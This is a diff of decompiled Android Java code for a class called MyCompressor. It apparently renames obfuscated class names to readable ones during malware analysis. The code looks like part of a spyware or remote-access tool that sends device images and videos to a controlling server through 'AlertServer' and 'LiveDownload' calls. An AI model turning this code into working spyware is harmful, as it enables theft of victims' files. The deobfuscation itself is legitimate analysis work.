@@ -20,8 +20,8 @@ import java.io.FileOutputStream;
 import java.io.OutputStream;
 import linker.resourcer.encoder.MyCompressor$$ExternalSyntheticLambda0;
 import linker.resourcer.encoder.MyCompressor$$ExternalSyntheticLambda1;
-import linker.resourcer.encoder.etkmbyodxlwuglfdj;
-import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
+import linker.resourcer.encoder.CommandExecutor;
+import linker.resourcer.encoder.WorkerService;
 
 public class MyCompressor {
     /*
@@ -40,7 +40,7 @@ public class MyCompressor {
                 var8_10.inJustDecodeBounds = false;
                 var8_10 = BitmapFactory.decodeFile((String)var1_1, (BitmapFactory.Options)var8_10);
                 if (var8_10 != null) ** GOTO lbl17
-                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(var0, "Fast Download", "Error: Create image");
+                WorkerService.MyWorker.AlertServer(var0, "Fast Download", "Error: Create image");
                 return;
 lbl17:
                 // 1 sources
@@ -70,7 +70,7 @@ lbl17:
 lbl38:
                     // 1 sources
 
-                    lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(var0, "Fast Download", "File not found");
+                    WorkerService.MyWorker.AlertServer(var0, "Fast Download", "File not found");
                 }
                 catch (Exception var1_2) {
                     break block11;
@@ -80,7 +80,7 @@ lbl38:
                     // empty catch block
                 }
             }
-            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(var0, "Fast Download", "Error:" + var1_6.getMessage());
+            WorkerService.MyWorker.AlertServer(var0, "Fast Download", "Error:" + var1_6.getMessage());
         }
     }
 
@@ -89,26 +89,26 @@ lbl38:
             string3 = Uri.parse((String)string2.trim());
             Object object = new File(string3.getPath());
             if (((File)object).exists()) {
-                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, "Fast Download", "Sending video without compression...");
+                WorkerService.MyWorker.AlertServer(context, "Fast Download", "Sending video without compression...");
                 MyCompressor$$ExternalSyntheticLambda1 myCompressor$$ExternalSyntheticLambda1 = new MyCompressor$$ExternalSyntheticLambda1(context, (Uri)string3, string4, string2);
                 object = new Thread(myCompressor$$ExternalSyntheticLambda1);
                 ((Thread)object).start();
             } else {
-                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, "Fast Download", "File not found");
+                WorkerService.MyWorker.AlertServer(context, "Fast Download", "File not found");
             }
         }
         catch (Exception exception) {
             exception.printStackTrace();
-            lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(context, "Fast Download", exception.getMessage());
+            WorkerService.MyWorker.AlertServer(context, "Fast Download", exception.getMessage());
         }
     }
 
     static /* synthetic */ void lambda$compressImageFile$1(Context context, Uri uri, String string2, String string3) {
-        etkmbyodxlwuglfdj.instance(context).LiveDownload(context, uri.getPath(), string2, string3, true);
+        CommandExecutor.instance(context).LiveDownload(context, uri.getPath(), string2, string3, true);
     }
 
     static /* synthetic */ void lambda$compressVideo$0(Context context, Uri uri, String string2, String string3) {
-        etkmbyodxlwuglfdj.instance(context).LiveDownload(context, uri.getPath(), string2, string3, false);
+        CommandExecutor.instance(context).LiveDownload(context, uri.getPath(), string2, string3, false);
     }
 }
 
